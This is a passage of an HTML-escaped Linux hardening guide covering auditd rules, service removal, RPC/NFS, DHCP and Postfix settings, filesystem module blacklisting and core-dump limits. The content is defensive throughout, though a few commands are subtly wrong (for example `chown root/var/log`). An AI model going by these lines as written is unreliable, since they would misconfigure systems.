&lt;span class=&quot;c&quot;&gt;#Record Attempts to Alter Logon and Logout Events&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /var/log/faillog &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; logins
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /var/log/lastlog &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; logins

&lt;span class=&quot;c&quot;&gt;#Record Attempts to Alter Process and Session Initiation Information&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /var/run/utmp &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; session
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /var/log/btmp &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; session
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /var/log/wtmp &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; session

&lt;span class=&quot;c&quot;&gt;#Ensure auditd Collects Unauthorized Access Attempts to Files (unsuccessful)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; creat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; openat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open_by_handle_at &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;truncate&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; ftruncate &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-EACCES&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; access
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; creat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; openat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open_by_handle_at &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;truncate&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; ftruncate &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-EPERM&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; access
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; creat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; openat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open_by_handle_at &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;truncate&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; ftruncate &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-EACCES&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; access
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; creat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; openat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; open_by_handle_at &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;truncate&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; ftruncate &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-EPERM&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; access

&lt;span class=&quot;c&quot;&gt;#Ensure auditd Collects Information on the Use of Privileged Commands&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#  Find setuid / setgid programs then modify and uncomment the line below.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;##  sudo find / -xdev -type f -perm -4000 -o -perm -2000 2&amp;gt;/dev/null&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -a always,exit -F path=SETUID_PROG_PATH -F perm=x -F auid&amp;gt;=500 -F auid!=4294967295 -k privileged&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#Ensure auditd Collects Information on Exporting to Media (successful)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ARCH &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; mount &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#Ensure auditd Collects File Deletion Events by User&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ARCH &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rmdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;unlink&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; unlinkat &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; rename &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; renameat &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid&amp;gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;500 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; auid!&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4294967295 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; delete

&lt;span class=&quot;c&quot;&gt;#Ensure auditd Collects System Administrator Actions&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /etc/sudoers &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; wa &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; actions

&lt;span class=&quot;c&quot;&gt;#Ensure auditd Collects Information on Kernel Module Loading and Unloading&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /sbin/insmod &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; x &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; modules
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /sbin/rmmod &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; x &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; modules
&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /sbin/modprobe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; x &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; modules
&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; always,exit &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b64 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; init_module &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; delete_module &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; modules

&lt;span class=&quot;c&quot;&gt;#Make the auditd Configuration Immutable&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; 2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;##Removal of Unrequired Services&lt;/p&gt;

&lt;p&gt;The section outlines software that should be removed, instruction for disabling the service is also documented.&lt;/p&gt;

&lt;h3 id=&quot;bulk-remove-of-services&quot;&gt;Bulk Remove of Services&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Remove&lt;/span&gt;
yum remove xinetd
yum remove telnet-server
yum remove rsh-server
yum remove telnet
yum remove rsh-server
yum remove rsh
yum remove ypbind
yum remove ypserv
yum remove tftp-server
yum remove cronie-anacron
yum remove &lt;span class=&quot;nb&quot;&gt;bind
&lt;/span&gt;yum remove vsftpd
yum remove httpd
yum remove dovecot
yum remove squid
yum remove net-snmpd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;bulk-enable--disable-services&quot;&gt;Bulk Enable / Disable Services&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#Disable / Enable&lt;/span&gt;
systemctl disable xinetd
systemctl disable rexec
systemctl disable rsh
systemctl disable rlogin
systemctl disable ypbind
systemctl disable tftp
systemctl disable certmonger
systemctl disable cgconfig
systemctl disable cgred
systemctl disable cpuspeed
systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;irqbalance
systemctl disable kdump
systemctl disable mdmonitor
systemctl disable messagebus
systemctl disable netconsole
systemctl disable ntpdate
systemctl disable oddjobd
systemctl disable portreserve
systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;psacct
systemctl disable qpidd
systemctl disable quota_nld
systemctl disable rdisc
systemctl disable rhnsd
systemctl disable rhsmcertd
systemctl disable saslauthd
systemctl disable smartd
systemctl disable sysstat
systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;crond
systemctl disable atd
systemctl disable nfslock
systemctl disable named
systemctl disable httpd
systemctl disable dovecot
systemctl disable squid
systemctl disable snmpd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-secure-rpc-client-service&quot;&gt;Disable Secure RPC Client Service&lt;/h3&gt;

&lt;p&gt;Disable rpcgssd:&lt;/p&gt;

&lt;p&gt;The rpcgssd service manages RPCSEC GSS contexts required to secure protocols that use RPC (most often Kerberos and NFS). The rpcgssd service is the client-side of RPCSEC GSS. If the system does not require secure RPC then this service should be disabled. The rpcgssd service can be disabled with the following command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable rpcgssd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-secure-rpc-server-service&quot;&gt;Disable Secure RPC Server Service&lt;/h3&gt;

&lt;p&gt;Disable rpcsvcgssd:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable rpcsvcgssd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-rpc-id-mapping-service&quot;&gt;Disable RPC ID Mapping Service&lt;/h3&gt;

&lt;p&gt;Disable rpcidmapd.&lt;/p&gt;

&lt;p&gt;The rpcidmapd service is used to map user names and groups to UID and GID numbers on NFSv4 mounts. If NFS is not in use on the local system then this service should be disabled. The rpcidmapd service can be disabled with the following command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable rpcidmapd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-network-file-systems-netfs&quot;&gt;Disable Network File Systems (netfs)&lt;/h3&gt;

&lt;p&gt;The netfs script manages the boot-time mounting of several types of networked filesystems, of which NFS and Samba are the most common. If these filesystem types are not in use, the script can be disabled, protecting the system somewhat against accidental or malicious changes to /etc/fstab and against flaws in the netfs script itself. The netfs service can be disabled with the following command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl disable netfs&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-network-file-system-nfs&quot;&gt;Disable Network File System (nfs)&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable nfs&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;if-you-dont-need-ssh-disable-it&quot;&gt;If you don’t need SSH disable it&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable sshd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-ssh-iptables-firewall-rule&quot;&gt;Disable SSH iptables Firewall rule&lt;/h3&gt;

&lt;p&gt;Only do this if you don’t need SSH.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; NEW &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note&quot;&gt;
  &lt;h5&gt;Tips™ - You probable need to leave SSH alone&lt;/h5&gt;
  &lt;p&gt;Unless you know you don't need SSH, leave SSH and it's iptables rule enabled.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;###Remove Rsh Trust Files&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /etc/hosts.equiv
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; ~/.rhosts&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-avahi-server-software&quot;&gt;Disable Avahi Server Software&lt;/h3&gt;

&lt;p&gt;The avahi-daemon service can be disabled with the following command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable avahi-daemon&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-the-cups-service&quot;&gt;Disable the CUPS Service&lt;/h3&gt;

&lt;p&gt;If you don’t need CUPS, disable it to further reduce your attack surface:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable cups&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-dhcp-service&quot;&gt;Disable DHCP Service&lt;/h3&gt;

&lt;p&gt;The dhcpd service should be disabled on any system that does not need to act as a DHCP server.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl disable dhcpd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;uninstall-dhcp-server-package&quot;&gt;Uninstall DHCP Server Package&lt;/h3&gt;

&lt;p&gt;If you don’t need a DHCP client, remove it:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yum erase dhcp&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-dhcp-client&quot;&gt;Disable DHCP Client&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/sysconfig/network-scripts/ifcfg-eth0&lt;/code&gt; (if you have more interfaces, do this for each one) and make sure the address is statically assigned with the BOOTPROTO=none&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;none

&lt;span class=&quot;nv&quot;&gt;NETMASK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;255.255.255.0
&lt;span class=&quot;nv&quot;&gt;IPADDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.2
&lt;span class=&quot;nv&quot;&gt;GATEWAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;specify-additional-remote-ntp-servers&quot;&gt;Specify Additional Remote NTP Servers&lt;/h3&gt;

&lt;p&gt;Open &lt;code&gt;/etc/ntp.conf&lt;/code&gt; and add the following line:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;server ntpserver&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Use an internal NTP server if possible.&lt;/p&gt;

&lt;h3 id=&quot;enable-postfix&quot;&gt;Enable Postfix&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;postfix&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;remove-sendmail&quot;&gt;Remove Sendmail&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yum remove sendmail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;postfix-disable-network-listening&quot;&gt;Postfix Disable Network Listening&lt;/h3&gt;

&lt;p&gt;Open, &lt;code&gt;/etc/postfix/main.cf&lt;/code&gt; and ensure the following inet_interfaces line appears:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;inet_interfaces &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; localhost&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;configure-smtp-greeting-banner&quot;&gt;Configure SMTP Greeting Banner&lt;/h3&gt;

&lt;p&gt;Change the greeting banner, the default banner discloses the SMTP server is Postfix.&lt;/p&gt;

&lt;h3 id=&quot;disable-xinetd-service&quot;&gt;Disable xinetd Service&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl disable xinetd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;system-audit-logs-permissions&quot;&gt;System Audit Logs Permissions&lt;/h3&gt;

&lt;p&gt;System audit logs must have 0640 or less permissions set.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;0640 audit_file&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;system-audit-logs-must-be-owned-by-root&quot;&gt;System Audit Logs Must Be Owned By Root&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo chown &lt;/span&gt;root/var/log&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;disable-autofs&quot;&gt;Disable autofs&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;chkconfig &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt; 0123456 autofs off
service autofs stop&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-uncommon-filesystems&quot;&gt;Disable uncommon filesystems&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install cramfs /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/cramfs.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install freevxfs /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/freevxfs.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install jffs2 /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/jffs2.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install hfs /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/hfs.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install hfsplus /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/hfsplus.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install squashfs /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/squashfs.conf
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;install udf /bin/false&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/modprobe.d/udf.conf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-core-dumps-for-all-users&quot;&gt;Disable core dumps for all users&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;vi /etc/security/limits.conf&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; hard core 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-core-dumps-for-suid-programs&quot;&gt;Disable core dumps for SUID programs&lt;/h2&gt;

&lt;p&gt;Run &lt;code&gt;sysctl -w fs.suid_dumpable=0&lt;/code&gt; and &lt;code&gt;fs.suid_dumpable = 0&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Set runtime for fs.suid_dumpable&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
sysctl &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; fs.suid_dumpable&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0

&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# If fs.suid_dumpable present in /etc/sysctl.conf, change value to &quot;0&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#     else, add &quot;fs.suid_dumpable = 0&quot; to /etc/sysctl.conf&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--silent&lt;/span&gt; ^fs.suid_dumpable /etc/sysctl.conf &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
     &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/^fs.suid_dumpable.*/fs.suid_dumpable = 0/g'&lt;/span&gt; /etc/sysctl.conf
&lt;span class=&quot;k&quot;&gt;else
